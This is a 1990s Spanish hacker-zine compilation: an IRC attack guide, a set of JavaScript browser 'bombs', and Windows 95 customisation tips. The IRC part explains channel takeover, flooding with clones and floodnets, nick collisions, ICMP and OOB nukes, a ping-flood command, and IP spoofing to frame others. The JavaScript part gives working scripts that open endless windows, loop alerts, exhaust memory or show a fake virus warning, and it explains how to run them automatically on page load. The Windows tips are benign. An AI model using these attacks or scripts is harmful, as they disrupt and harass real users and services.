2.3.- Otras formas de conseguir op.-

 La otra alternativa para conseguir el op es que alguien te lo de ;-) . Puede ser un op 
del canal o un irc-op de la red, aunque para esto último tendrás que dar una justificación 
convincente (como por ejemplo que os acaban de tomar el canal, alguien os ha atacado, étc). 

 Para la primera alternativa entra en juego tu "don de la palabra": trata de hacerte amigo de 
algún op para que éste te lo pase. En ese momento ya estás capacitado para quitarle el op a 
todos los demás ("mass-deop") y quedarte con el canal. Esto lo hacen automáticamente muchos 
scripts ("automatic-deop"): nada más darte el op el script automáticamente deopea a todos los 
ops (excepto a tí, claro). 
  

2.4.- Bot de servicio.-

 Se trata de un "usuario" muy especial... un robot que se encarga entre otras cosas de 
proteger los canales. En la red hispana se llama Scytale (en CobraNet, por ejemplo, es 
KingCobra) y está dentro de muchos canales (registrados). Normalmente suele tener op, con 
lo cual el canal deja de ser opless y se evita el net-hack :-( Suele tener ircop-status 
[channel-service status] y además
tiene otras funciones en las que no pienso entrar. Resumiendo: si hay bot, nuestro gozo 
a un pozo. 
  
  

3.- Ataques.

 En esta sección entraremos en materia... }:-)  Nuestro objetivo: tirar a alguien del 
server irc. 
  

3.1.- Flood.-

 Los servidores IRC tienen que controlar el tráfico de entrada (el que proviene del exterior) 
para evitar su congestión. Una de las formas de conseguirlo es no permitir que un cliente le 
mande más de una determinada cantidad de información en un pequeño intervalo de tiempo; o lo 
que es lo mismo:
la velocidad con que un cliente puede enviar datos al servidor está limitada. 

 Cuando un cliente supera el límite preestablecido por el servidor, éste cierra la conexión 
con el cliente: lo echa del servidor porque no puede soportar tanto caudal de entrada. 
El servidor lo "explica" así: 

[1:59] *** _^TkLaS^_ has quit IRC (Excess Flood) 

 Un flood, en general, no es otra cosa que mandar mucha información en poco tiempo a alguien
para intentar que se sature. Se puede floodear una dirección IP, ..., o lo que ahora nos 
concierne: un servidor de IRC. 

 La manera de aprovechar el flood en nuestro favor consiste en mandar muchas peticiones de
información a nuestra víctima, de forma que ésta, al contestar, supere el límite del servidor 
y éste lo eche. Por ejemplo, si le mandamos muchos /ctcp version's seguidos (requiriendo 
información sobre el programa cliente que está utilizando) la víctima floodeará al servidor 
cuando conteste porque mandará muchas veces (tantas como peticiones haya habido) el texto de 
respuesta al servidor (para que del servidor vaya al cliente que peticionó, i.e., al atacante). 

 En esto del flood juega un papel muy importante el número de peticiones que se reciben en un
pequeño intervalo de tiempo. Cuantas más se reciban, más posibilidades hay de que el flood 
tenga éxito. Por ello no es ninguna tontería mandar peticiones desde varios puntos a la vez, y 
no desde uno sólo, es decir, varios usuarios (¡que podrían ser una misma persona!) de la red 
IRC manden peticiones a la víctima todos a la vez en un determinado momento. Si los usuarios 
(nicks) corresponden a una misma persona (una misma dirección IP) se habla de clones. 
Por tanto, una posible forma de ataque sería crearnos muchos clones y peticionar a la vez 
desde todos ellos a la víctima. 

 Pero los servidores también suelen estar preparados para evitar muchos clones 
(cada clone ocupa,por decirlo de alguna manera, una "linea" de entrada al servidor, 
y esto consume recursos del mismo). Suele haber un máximo permitido (en el irc hispano es 2) 
denegándosele el acceso a la red a un tercer clone, o en caso de que éste lo consiguiese 
expulsándosele del servidor ("matándolo")
(el programa servidor revisa periódicamente las IP's conectadas y detecta cuando hay varios
usuarios con una misma dirección IP): 

[1:32] *** _^Virus^_ has quit IRC (Killed (Clones!)) 

 ¿Cómo provocar un flood con más de 2 clones entonces? La respuesta es simple: en principio no
se puede. ¿Entonces? Pues la solución es que varias personas distintas se pongan de acuerdo 
para atacar a la vez a la víctima. Cada persona podría tener a su vez varios clones. 
Por ejemplo, si A (atacante) quiere atacar a V (víctima), A se pone de acuerdo con B y C 
(otras 2 personas atacantes). A su vez supongamos que cada atacante tiene 2 clones: 
i.1 e i.2 (donde i=A,B,C).
Entonces tendremos 6 usuarios (conexiones IRC) distintos atacando a V, que serían A.1, A.2,  
B.1,B.2, C.1 y C.2. Pero hay un problema: ¿cómo sincronizarse para atacar? ¿Cómo "ponerse de
acuerdo" para mandar las peticiones en un determinado momento? Para esto existe lo que se
denomina "floodnet" que, como habrá adivinado nuestro ávido lector, es una "red" (asociación) 
de gente cuyo único objetivo es floodear a alguien. La ventaja que tiene es que la 
sincronización entre los distintos componentes de la floodnet es automática 
(lo hacen los scripts) lo cual resuelve el problema anterior. También existe lo que se 
denomina "botnet" y que es análogo a la floodnet pero usando bots (no confundir con los 
"de servicio"; estos últimos los ponen los servers de la red irc y
no los usuarios) los cuales serán lanzados desde alguna shell Unix (intérprete de comandos 
en una máquina Unix). Los bots suelen estar prohibidos y cuando se detectan, a lo menos, son 
expulsados: 

[1:32] *** Viernes13 has quit IRC (Killed (You are not welcome to this network!)) 

  
 Hoy en día tanto los programas clientes de IRC como los scripts implementan protecciones
anti-flood que dificultan enormemente el éxito de un ataque de tipo flood. Por ejemplo, cuando
detectan varias peticiones seguidas mandan las respuestas espaciadas en el tiempo (con pausas) 
y no inmediatamente, con lo cual se evita el flood. 

 También hay técnicas de flood bastante optimizadas (por ejemplo, usando una floodnet) 
aunque en general un ataque flood no suele ser demasiado eficiente y es más costoso lograr 
su éxito que con algunas de las técnicas que se describen a continuación. 
  

3.2.- Nick collide.-

 Un "nick collide" ocurre cuando dos personas tienen un mismo nick. En principio esto no 
debería ser posible (el servidor no deja usar un nick que ya está en uso) pero hay dos 
situaciones en las que podría darse el caso y que se describen en los dos puntos siguientes. 

 El resultado de un nick collide depende del servidor (ircd). En servidores antiguos 
(sin protección) el collide se resuelve matando a los dos usuarios con mismo nick (¡ambos!). 
En otros más inteligentes (con protección) el servidor guarda información acerca de los 
usuarios y puede saber que usuario tiene el nick con mayor antigüedad 
(i.e. quién se lo puso antes), matando únicamente al usuario con el nick más reciente 
(protegiendo al usuario más "veterano"). 
  

3.2.1.- Split server collide.-

 Se basa en aprovechar un net-split: 

 - Esperar un split. 
 - Entrar (conectar) al servidor spliteado. 
 - Ponerse como nick el de la víctima. 
 - Esperar a que se deshaga el split. 

 Si todo va bien (el servidor no tiene protección), a la vuelta del split se detectará el 
collide y se matarán tanto al atacante como a la víctima. Lógicamente nuestro usuario 
atacante será un clone nuestro, con lo cual no pasa nada si es killeado. 
  

3.2.2.- Lag collide.-

 Consiste en aprovechar el lag de un servidor, o lo que es lo mismo, el retraso en recibir los
mensajes de otros servidores. Esta técnica es más efectiva que la anterior, pues funciona en
servidores con protección. 

 Los pasos serían los siguientes: 

 - Meter un clone en el servidor lageado. 
 - Esperar a que la víctima cambie de nick (esto lo detectamos desde otro servidor no lageado). 
 - Cambiar rápidamente el nick de nuestro clone y ponerle el que se acaba de poner la víctima 
   (el nuevo). 
 - Esperar al lag. ;) 

 Lo que ocurre es que nuestra orden de cambiar el nick para nuestro clone llega antes al 
servidor (lageado) que la orden de cambio de nick de la víctima debido a que nuestra orden 
va directamente de nuestro cliente al servidor lageado mientras que la otra va a través de 
la red IRC (donde hemos supuesto que se introduce un lag notable). Esto hace que el servidor 
(lageado) tome a nuestro clone como "dueño" legítimo del nick y mande un kill al otro 
(la víctima). Esto ocurriría en caso de servidores protegidos; si es no protegido el resultado
es que ambos mueren, resultado también aceptable, pues hemos acabado con nuestro objetivo. };-) 
  

3.3.- Nuke.-

 "Nuke" es la denominación genérica que se le suele dar a cualquier forma de ataque consistente en
mandar paquetes arbitrarios a una determinada dirección IP (no es que sea una definición
demasiado ortodoxa pero bueno... :)). Realmente el término "nuke" siempre se ha referido al
primero de los dos tipos que comentaremos, aunque aquí se ha preferido tomar una definición más
amplia de dicha palabra. 
  

3.3.1.- ICMP nuke.-

 El más veterano de los nukes [ :-) ] usa un protocolo subyacente de IP, el ICMP ("Internet
Control Message Protocol": parte integral del protocolo de Internet [IP] que resuelve errores y
controla los mensajes), para romper una conexión cliente-servidor de IRC (tirar a alguien del
server). Para entender cómo funciona hay que hablar un poco de protocolos; es aburrido pero no
hay más remedio... 

 Una conexión IRC (cliente-servidor, que es lo que nos interesa) utiliza el protocolo TCP 
(nivel 4 [transporte] en la torre OSI), el cual se apoya sobre IP (nivel 3 [red]). 
IP se encarga, entre otras cosas, de hacer el rutado de paquetes ("datagramas IP"), 
es decir, dado un destino ir enviando los paquetes por el camino apropiado hasta alcanzar 
el host destino. TCP no ve nada de esto, tan sólo el destino directamente (manda los segmentos 
TCP directamente al destino), porque IP lo oculta (hace que el rutado sea transparente a TCP). 
Lógicamente para que un protocolo de nivel superior funcione correctamente, también deberán 
hacerlo todos los que estén por debajo. En particular, para que nuestra conexión TCP (IRC) 
se mantenga "viva", IP debe funcionar perfectamente. Y aquí es donde interviene ICMP: se 
encarga de informar de posibles anomalías que se han producido en el nivel 3 (IP), como por 
ejemplo, "host unreachable", que significaría que no se ha podido alcanzar el host 
(el paquete IP ha ido dando saltos ["hops"] de un nodo a otro, hacia el destino, y ha llegado 
un momento en el que un determinado nodo intermedio no sabía qué hacer con él o ha expirado 
el tiempo de vida de dicho paquete). En este caso, el paquete que informa del error (ICMP) lo 
envía el nodo intermedio que se ha dado cuenta del error  hacia el "remitente" que lanzó el 
paquete original (que no se ha podido entregar a su destinatario). Los mensajes ICMP se
situan dentro del campo de datos de un datagrama IP y se envían exactamente igual que si fueran
datos IP (no son prioritarios). No es objetivo de este escrito tratar más a fondo este tema 
(para los interesados les aconsejo el libro "Internetworking with TCP/IP, vol I", 
de Douglas E. Comer, disponible en castellano ya en su tercera edición). 

 Resumiendo: mediante ICMP informamos de que IP ha fallado, y por tanto, también los niveles
superiores como TCP. 

 Comprendiendo lo anterior ya se puede intuir en qué consiste el ICMP nuke: mandar mensajes
ICMP falseados, engañando al destino, haciéndole creer que el otro extremo ha detectado un  
error y por tanto, provocando un "cierre" de la comunicación. Vamos a explicar un poco mejor 
ésto. 

 En una conexión siempre tenemos dos extremos, lo que da dos posibilidades a la hora de 
engañar,según lo hagamos  a uno u otro. En el caso de una conexión IRC, podemos llevar a cabo 
dos formas de ataque: 

 * Server nuking (nukear al server): los mensajes ICMP se mandan al servidor IRC, haciéndole
creer que se ha producido un error al intentar comunicarse con el cliente. Como respuesta a 
este mensaje el server cierra la conexión que tenía con dicho cliente. El efecto producido es 
la "expulsión" del usuario por parte del servidor. 

 * Client nuking (nukear al cliente): esta vez se envían los ICMP's al cliente; éste cree que 
el servidor no está disponible y cierra la conexión (el cliente). El servidor no sabe nada en 
principio, pero detecta el cierre de conexión por parte del cliente, dando el correspondiente 
error y cerrando también la conexión por su parte. 

 En teoría las dos fomas de nuking son perfectamente válidas y eficientes, aunque hay que 
tener ciertas consideraciones en cuenta, como son: 

- tanto servidor como cliente pueden tener protección anti-nuke y puede ser necesario atacar 
uno porque el otro esté protegido (ver más adelante). 
- si atacas a un cliente, éste puede detectar quién le está atacando con un simple analizador 
de paquetes IP o tracer, y también podría responder con otro ataque de este o cualquier otro 
tipo (cuidado con quién te metes ;-)). 
- si atacas al servidor, el cliente no tiene manera de saber quién le ha "atacado" porque los 
mensajes ICMP no le han llegado a él sino al servidor (ventaja); pero por otro lado, el 
servidor sí sabe quién ha hecho el ataque y puede resultar en una K/G-Line a dicho usuario 
por parte del servidor (el usuario podría ser baneado de toda la red de IRC). 
- los inconvenientes de los dos puntos anteriores pueden ser solventados falseando la 
dirección origen de los mensajes ICMP que se envían. Esta técnica se conoce como "spoofing" 
(ver punto 4). 

 Hay diversos tipos de error ICMP que se pueden utilizar a la hora de hacer un nuke. En cuanto 
a la información práctica de cómo utilizar un nuker (programa "nukeador"), debemos tener en 
cuenta que además de suministrarle el tipo de error que se desea producir, juegan un papel 
muy importante los puertos, tanto origen como destino, que se elijan. 

 Una conexión IRC (TCP) queda definida unívocamente por los pares dirección IP origen-puerto
origen y dirección IP destino-puerto destino. Estos datos son los que hay que suministrarles 
al programa nukeador. Puertos típicos del servidor de IRC (será el puerto destino en caso de 
server nuking o el fuente si se trata de un client nuking) son 6665-9,  4400-6, 7000 y 7777. 
En realidad cada servidor IRC tiene unos puertos oficialmente reconocidos (que son conocidos 
públicamente: los podemos leer en el motd ["mensaje del dia"] al entrar en el IRC) y otros que 
podríamos denominar como privados, y que se usan por ejemplo para las conexiones entre los 
distintos servidores que forman la red. Un usuario puede estar usando uno de estos puertos 
"fantasmas" (aunque el servidor también puede limitar el acceso a estos puertos) para 
esconderse de nukes, puesto que necesitamos conocer este dato para que el nuke sea efectivo. 

 También necesitamos conocer el puerto del cliente, aunque esto es más difícil porque varía 
mucho (no son fijos como en el caso anterior) dependiendo del sistema operativo que esté 
corriendo dicho cliente, los puertos que ya tuviera ocupados antes de establecer la conexión 
IRC, étc. Lo normal es hacer un barrido de estos puertos empezando por el 1024 
(hay puertos que por convenio siempre se asignan a determinadas tareas y no se pueden usar 
arbitrariamente con lo cual no necesitamos barrerlos) y acabando en 4000, por ejemplo, 
aunque podría ser necesario aumentar este número. 

 Es también muy útil utilizar un "port-scan": programa que va probando los distintos puertos de una
dirección IP (destino) dada e informa de la respuesta recibida para cada uno de  dichos puertos (así
podemos saber, por ejemplo, qué puertos de un servidor están dedicados a aceptar conexiones
IRC). 

 A continuación transcribo mensajes típicos de salida de nuestras potenciales víctimas en 
una sesión típica de IRC: 

[1:42] *** aRmiTaGe has quit IRC (Read error to aRmiTaGe[ig-183.arrakis.es]: Connection reset by peer) 
[1:13] *** KoNtRoL has quit IRC (Read error to KoNtRoL[195.76.99.76]: EOF from client) 
[3:17] *** BrOKeNn has quit IRC (Read error to BrOKeNn[194.224.57.171]: Protocol not available) 
[5:25] *** Eli has quit IRC (Read error to Eli[info760.jet.es]: Network is unreachable) 
[5:26] *** Eli has quit IRC (Read error to Eli[info760.jet.es]: Machine is not on the network) 
[4:20] *** vp has quit IRC (Read error to vp[ia-176.arrakis.es]: Connection refused) 
[2:41] *** Estrayk has quit IRC (Read error to Estrayk[ctv3011.ctv.es]: No route to host) 

 La protección anti-nuke, a grosso modo, pasa por ignorar los mensajes ICMP que lleguen, aunque
ésto ya está limitando el propio funcionamiento del protocolo IP, en el sentido de que ICMP es
parte integrante de IP y no se debería inhibir (¿qué ocurriría si llega un mensaje "de verdad" 
y es ignorado?). Se puede llevar a cabo más o menos "finamente": por ejemplo descartar solo 
los ICMP's de un tipo y no todos los posibles. Se podría lograr con un firewall (software o 
hardware encargado de filtrar los paquetes provinientes de la red en base a una reglas 
previamente definidas)convenientemente configurado. 
  

3.3.2.- OOB nuke.-

 También conocido como 'winnuke', ya que afecta sólo al sistema operativo Windows, en 
cualquiera de sus "sabores": 3.x, 95 y NT. Se basa en un bug que tiene este SO en la pila 
de protocolos por el cual el sistema se cuelga ("error de protección general...blah, blah...") 
cuando recibe un paquete con el flag OOB ("Out of band") activado. El ataque es sencillo: 
mandar un paquete de este tipo a un puerto (normalmente el 139) de nuestrá víctima 
(ésta debe estar corriendo Windows, lo cual es muy normal hoy en día). Existen programas ya 
hechos a los cuales simplemente le das la dirección IP de la víctima y el programa lo hace todo. 

 La forma de protegerse es cerrar los puertos por los que nos puedan atacar 
(el 139 principalmente) o aplicar algún parche al SO para quitarnos el bug. Otra solución 
menos recomendable es la que llevan a cabo algunos ISPs (proveedores de Internet), y que 
consiste en filtrar todos los paquetes dirigidos al puerto 139 (inconveniente: nos están  
dejando inoperativo ese puerto). Hoy en día es muy popular este bug y normalmente está 
ampliamente parcheado (aunque siempre habrá algún que otro despistado que no lo tenga 
instalado }=)). 

 Como hemos dicho, este ataque no sólo consigue echar a la víctima del server sino que además 
le deja colgado el ordenador (tendrá que hacer un reboot), lo que lo hace especialmente 
peligroso. La víctima saldrá del IRC con un mensaje de tipo ping-timeout como: 

[19:56] *** Goku has quit IRC (Ping timeout for Goku[system.tech.arrakis.es]) 
  

3.4.- Ping.-

 Algunos los llama también "IP bombs" (bombas IP). Un ping es un tipo de mensaje ICMP que se
usa para ver si una máquina se encuentra operativa y accesible. El procedimiento es enviarle un ping
a la máquina; ésta lo recibe y contesta. Al recibir la contestación ya sabemos que la máquina 
vive. Si no se recibe en un plazo dado se considera como no accesible (la máquina podría estar 
apagada, o todos los "caminos" en la red hacia ella cortados). Además podemos obtener más datos 
como el grado de saturación de una máquina o red (midiendo el tiempo de respuesta de la máquina,
es decir, el tiempo transcurrido desde que una máquina origen envía el ping hasta que recibe 
la contestación de la otra). 

 La manera de usar esto de forma ofensiva consiste en mandar más pings a un usuario de los que 
su máquina pueda contestar, saturándole su conexión a Internet. Por tanto se debe de hacer 
desde un enlace más potente que el que pretendemos atacar. 

 Lo típico es que la víctima esté en su casa y tenga un modem. Por tanto, necesitamos una 
conexión a inet más rápida que eso. Lo normal es atacar desde una máquina ubicada ya en la 
red (conectada mediante ATM, FDDI, ...). Por ejemplo, puede valer la cuenta de la Universidad 
;-). La forma de hacerlo sería abriéndonos un shell y tecleando: 

  $  ping -s 32000 <direcc. IP> 

(la sintaxis puede variar ligeramente según sistema operativo). 

 Los paquetes que se envían al hacer ping son típicamente muy pequeños. Con el modificador   
-s
estamos forzando un nuevo tamaño (32000 bytes es aceptable; también podeis probar con 64000). 

 Pensad: un modem de 28.8 tardará unos 18 segs. en recibir 64 Kbytes (sin considerar
compresión), mientras que desde nuestra shell lo hemos mandado en ¡¡décimas de segundo!! Si
consideramos además que el comando ping manda más de un paquete (los que queramos) ...
¡boom! Tendréis el modem de vuestra víctima trabajando a toda pastilla para nada y 
fastidiándole todo lo que esté haciendo. En particular, le estropearéis su conexión al IRC: 
en el mejor de los casos la víctima tendrá un lag horroroso y el peor será expulsada del 
servidor por "ping time-out".

  

3.5.- Ssping.-

 Nos encontramos ante otro bug parecido al del OOB, que afecta a Win95 y NT (aunque no a
todas las configuraciones), y cuya idea es que el "maravilloso" Windows "se lía" a la hora de
reconstruir paquetes que le han llegado fragmentados y acaba con un cuelgue del ordenador. El
ataque consiste en precisamente mandar esos paquetes fragmentados a la víctima. 

 Un bug de este tipo es viejo conocido de los sistemas UNIX (el ataque se conocía como "ping of
death"); pero la novedad es que ahora lo sufren los Windows. Aunque son cosas técnicamente
diferentes, la forma de proceder a la hora de atacar es análoga a OOB: solo hay que saber la
dirección IP de la víctima y ¡boom!: le dejamos colgado el ordenador. 

 La solución pasa por parchear el S.O. En particular, este bug parece que no afecta al Trumpet
Winsock así que si lo usais estareis protegidos. 
  
  

4.- Spoofing.

 Esta técnica no es un ataque en sí pero permite mejorar y perfeccionar cualquier ataque 
(de los anteriores, por ejemplo). También puede ser la base de algún ataque, como ocurre con el IP
Spoofing que los hackers suelen emplear (me desviaría del tema  de este escrito si siguiese
escribiendo...). 

 Se trata de "spoofear" (=falsear) la dirección IP de origen de los paquetes que se mandan a la
víctima, de forma que ésta crea que el origen de dichos paquetes es otro (el que nosotros le
indiquemos). De esta forma protegemos nuestro anonimato, y en general podemos llevar a cabo
cualquier acción que se nos pueda ocurrir y que se derive de una falsa dirección source (origen)
Por ejemplo, podemos nukear a alguien, con la dirección fuente de otro, haciendo creer a la 
víctima (si ésta tiene un analizador de paquetes o algo parecido) que es el otro el que le 
está atacando }:-). 

 El spoofing es (o podría ser) una funcionalidad más del programa de ataque (del nuker, del 
ping, ...). Como consiste en manejar IP desde un muy bajo nivel en muchos casos se requieren 
privilegios especiales. Por ejemplo, en el caso de máquinas Unix, se necesita abrir 
"raw sockets" y ésto requiere de privilegios de superusuario (root). 
  
  

5.- Resources.

 Este apartado está dedicado, brevemente, a los distintos programas disponibles y útiles a 
nuestra causa :-). 

 Por ahora sólo incluyo la siguiente URL:  http://www.7thsphere.com/virus. Allí podrás
encontrar toda clase de utilidades para Windows y Linux: programas nukeadores, port-scanners,
étc... 
  
  

6.- Agradecimientos.

 Quisiera dar las gracias a jcea@argo.es por echarle un vistazo a este texto y por sus 
comentarios desinteresados sobre él. 
  
  

7.- Notas finales.

 Espero que este pequeño artículo os haya servido al menos para comprender un poco más el
funcionamiento del IRC. 

 También me gustaría recordar que el IRC no es un campo de batalla, y que no se debe atacar 
a la gente así porque así, salvo "en defensa propia" y pocos casos más justificados. O:-)  
En cualquier caso un ataque nunca está justificado desde el punto de vista de los ircops, 
así que cuidado con las K/G-lines ;-) 

 Por último, decir que este artículo es la primera versión y que pudiera contener numerosos 
errores así como algún que otro "punto negro". Se agradecería toda clase de comentarios y 
sugerencias para mejorar el documento: bug reports, asuntos que creáis no están bien 
explicados, temas que faltan y se deberían incluir, ..., y en definitiva todo lo que 
os gustaría que se incluyese en el documento. También se aceptan O-lines ;-) 

 Podeis contactar con el autor de este escrito por email:  roman@deathsdoor.com. O
localizarme en el IRC hispano bajo el nick de RoMaNSoFt. 

  c'U l8er!!!!! 

_______________________________________________________________________________________________

(c) RoMaN SoFt / LLFB, 1997.- (última modificación de este fichero: 30/07/97)

/////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\                                                                 

6.                     BOMBAS EN JAVASCRIPT

Con estos java scripts lo que lograras es joder a los navegadores IEXPLORER y
NETSCAPE en susversiones 3.x 2.x en adelante,respectivamente.
algunos de ellos no estan en su forma original, usalos con cuidado ;-)

                                EXPLODING WINDOWS BOMBOMS
este script lo que hace es abrir ventanas asta que el navegador de cuelga

<SCRIPT LANGUAGE="JavaScript"><!--function WindowBomb(){ var iCounter = 0 while (true) 
{ window.open("http://www.geocities.com/SiliconValley/Lakes/6417","CRASHING" + iCounter,
"width=1,height=1,resizable=no") iCounter++ }} // --></SCRIPT><FORM method=post 
name="FormAction" action="mailto:"+"jode@explorer"><INPUT TYPE="button" value="Exploding 
Windows" Name="btnExplodeWindows" onClick="WindowBomb()"> </FORM></font>

                                   ANNOYING BUTTON
este script crea un bucle infinito de ventanas de mensajes que no le deja salir de donde este:

<SCRIPT LANGUAGE="JavaScript"><!--function AnnoyingButton(){ while (true) window.alert
("A que jode?? ;)")}// --> </SCRIPT><FORM method=post name=
"FormAction" action="mailto:"+"jode@explorer"><INPUT TYPE="button" value=
"Annoying Button" Name="btnAnnoy" onClick="AnnoyingButton()"></FORM>

                                              EAT MEMORY
                               su propio nombre lo indica:
<SCRIPT LANGUAGE="JavaScript"><!--var szEatMemory = "HOLA QUIERES SER MI 
AMIGO"function EatMemoryInTime(){ szEatMemory = szEatMemory + szEatMemory window.status 
= "String Length is: " + szEatMemory.length window.setTimeout('EatMemoryInTime()',1); }
// --> </SCRIPT><FORM method=post name="FormAction" action="mailto:"+"jode@explorer">
<INPUT TYPE="button" value="Yumm... I like your memory" Name="btnEatTime" 
onClick="EatMemoryInTime()"> </FORM>

                                 VIRUS SIMULATOR
         cierra el navegador despues de simular un virus:
<SCRIPT LANGUAGE="JavaScript"><!-- function ConfirmClose() { 
alert("Error 107x has occoured. The virus:'Pecador de la Pradera' 
has been detected on Drive C. Please erase all infected files.") if 
(confirm("Please inform the the hardware vendor of this error.")) alert
('The virus has been contained, to fully recover the browser will shutdown'); 
else alert('The problem has not been fixed, the browser will shut downto prevent 
further contamination.') { window.close() }}//--></SCRIPT><FORM method=post name=
"FormAction" action="mailto:"+"jode@explorer"><INPUT type="button" value ="Infect me!" 
onClick="ConfirmClose()"></FORM>

 todos estos scripts los puedes usar de dos paneras:
la primera es en forma de boton.ejm:
<SCRIPT LANGUAGE="JavaScript"><!--function PutoExplorer(){ 
var uagent=navigator.userAgent; if (uagent.indexOf("MSIE") == 25) self.close()}// -->
</SCRIPT><FORM method=post name="FormAction" action="mailto:"+"jode@explorer">
<INPUT TYPE="button" value="Jode Explorer" Name="btnExplorer" onClick="PutoExplorer()">
</FORM>
o bien ejecutandolo cuando el navegador carge la web,los tienes que colocar entre <head> y 
</head>
o inmediatamente des pues de <body>.ejem:
<!--
                              var uagent=navigator.userAgent;
                              if (uagent.indexOf("MSIE") == 25)
                              self.close()
// -->
////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

                       ############################################
7.   		       #      como trucar el Güindows95		  #
                       ############################################
                       texto escrito por ZeD--www.angelfire.com/ak/HACKZED/ZED2.html
                                                       --http://come.to/HaCkS-wEb-RiNg
                       puedes subir este texto a tu web,bbs,ftp o lo que sea,siempre que 
                       mantengas este encabezado.
                                     ACTUALIZACION:10/8/98


ZeD no se hace responsable de los daños que el uso de este documento pueda ocasionar a tu pc
y te recomienda siempre hacer copias de seguridad (por si las moscas)


                             INDICE:
1.como trucar el internet explorer
2.pon el nombre que quieras a la papelera de reciclaje
3.cambia el icono de las carpetas por el que tu quieras
4.interface de 3.11 en w95
5.crear un acceseo directo para apagar el pc
6.cambiar el nombre de "mi pc"
7.MS2.sys
8.utilidades del sistema
9.PROXImamente
-------------------------------------------------------------------------------------------------
1.COMO TRUCAR EL INTERNET-EXPLORER v3.1 en adelante
simpre has querido cambiar el dibujio de la "E" que sale cuando estas navegando con el 
internet-explorer,pues es bien simple.
La imagen que sale es un archivo ".bmp" que esta en la carpeta ..../internet explorer/
son los archivos que se llaman "Ani38.bmp" y "Ani26.bmp" abrelos y mira como son.
Veras que son como una tira que segun la vas bajando se convierte en una animacion.
Vale pues ahora crea tu logo tal como esta definido en los archivos cambialo y ya tienes el 
explorer trucado (puedes bajarte algunas imagenes de mi pagina que esta en:
www.angelfire.com/ak/HACKZED/ZED2.html,en la seccion "download")


2.COMO CAMBIAR EL NOMBRE A LA PAPELERA DE RECICLAJE
cambiar el nombr de la papelera de reciclaje es muy simple:
cambia el nombre en la clave del "regedit":(esta en la carpeta "windows")
HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E


3.CAMBIAR EL ICONO DE LAS CARPETAS POR EL QUE TU QUIERAS
para cambiar el icono que representa las carpetas tienes que hacer lo siguiente:
Muchos de los iconos que por defecto traen algunos archivos se pueden cambiar simplemente
desde cualquier carpeta, mediante el menú ver, luego opciones... , tipos de arhivos y por 
último editar, e inmediatamente despues selecionar cambiar icono. Pero esto no siempre nos vale, 
sobre todo si queremos cambiar los iconos de por ejemplo, las carpetas, el menú de Inicio... 
Para ello el truco es el siguiente: 
Lo primero que tenemos que hacer es saber el icono que queremos cambiar... por ejemplo, 
para cambiar el icono de las carpetas, debemos ejecutar el registro, irnos a la seccion 
HKEY_CLASSES_ROOT\Folder\DefaultIcon en la parte derecha aparecerá (preterminado) 
"C:\WINDOWS\SYSTEM\shell32.dll,3", la primera idea.. que no funciona :) es ir y cambiar 
directamente el valor de la cadena para poner el icono que queremos. Pero lo que tenemos que 
hacer es ir a la sección 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ 
explorer y crear una nueva clave, Shell Icons, después creamos un nuevo valor de la cadena, 
con el número del icono indicado en el DefaultIcon que queremos cambiar, en nuestro caso el 3, 
seleccionamos este valor, pulsamos 2 veces y en Información del valor introducimos el path del 
archivo que tiene el icono que queremos poner, con su numero correspondiente. En mi caso es: 


nombre                 | datos
(predeterminado)         (valor no establecido)
3                        "c\iconos\folders.icl,70"

   Bueno.. ya hemos hecho lo más difícil. Pero aún queda algo más. Windows 95 guarda una 
cache de Iconos en el directorio de instalación del 95, llamado ShellIconCache, este archivo 
está oculto. Debemos de borrar este archivo para que los cambios surjan efecto, pero hay que 
borrarlo fuera de la sesión de Windows.. osea.. que hay que reiniciar en modo MS-DOS, quitar 
los atributos al archivo (en MSDOS este se llama shelli~1), borrarlo y reiniciar el entorno 
grafico (hoy en dia llamado sistema operativo.. :P) y ya está, tenemos nuestro icono favorito 
como icono de carpeta.. :) De igual manera con el resto de los iconos del 95. 

PD: Importante, si tenemos la utilidad TWEAK UI de las Powertoys de Microchof
 (si, MICROCHOF... ) podemos borrar el cache de iconos desde la pestaña Repair, 
con el botón Rebuid Icons. Y si tenemos el MicroAngelo.. todo esto nos lo hace ese
fantástico programa.. pero conviene saber hacer las cosas "a pelo". 


4.INTERFACE DEL W3.11 EN EL W95
este es bastante mas simple que el anterior,lo que tienes que hacer es lo siguiente:
1-edita el archivo "SYSTEM.INI" (directorio de windows)
2-en la seccion "BOOT",busca la linea que pone "SHELL=EXPLORER.EXE"
3-cambia lo de "EXPLORER.EXE" por "PROGMAN.EXE"
4-reinicia el pc y listo

5.ACCESO DIRECTO PARA APAGAR EL PC
esto es de lo mas simple,haz lo siguiente:
crea una cceso directo en el escritori,vete a propiedades y en loreferente a acceso direco 
busca "DESTINO".alli pones lo siguiente:
C:\WINDOWS\RUNDLL32.EXE user.exe,ExitWindows
le das a aplicar,acetar y ya esta

6.cambiar el nombre de "MI PC"
para hacer esot tienes que seguir los siguientes pasos:
vete al "REGEDIT" 
cambia la clave:: HKEY_CLASSES_ROOT\CLSID\{2OD04FE0-3AEA-1069-A2D8-08002B30309D} 
pon el nombre quele quieras poner a "MI PC"
y ya esta

-------------------------------------------------------------------------------------------------
7.MS2.sys
lo primero que tienes que hacer es localzar este archivo,una vez encontrado,para poder 
editarlo tendras que cambiar sus atributos.
una vez puedas editarlo,dirijete a la parte de "OPTIONS":

[Options]

BootDelay = 0 Aumenta la velocidad de booteo,el mensaje "Starting Windows..."
            no aparece.

BootMenu = 1 Despliega automaticamente el menu de arranque de WIndows 95.

BootMenuDefault = 1 El numero de opcion por default.

BootMenuDelay = 10 Numero de segundos que el menu de inicio es desplegado.

Logo = 0 No despliega la imagen del logo de arranque de Win95.

BootMulti = 1 Hace disponible un doble booteo con DOS.
-------------------------------------------------------------------------------------------------
8.UTILES DEL SISTEMA
el w95 trae algunas erramientas que te permitiran hacer cosillas (algo basicas) muy interesantes
para ir empezando,aqui te voy a explicar el funcionamiento de dos de ellas el Telnet,un viejo
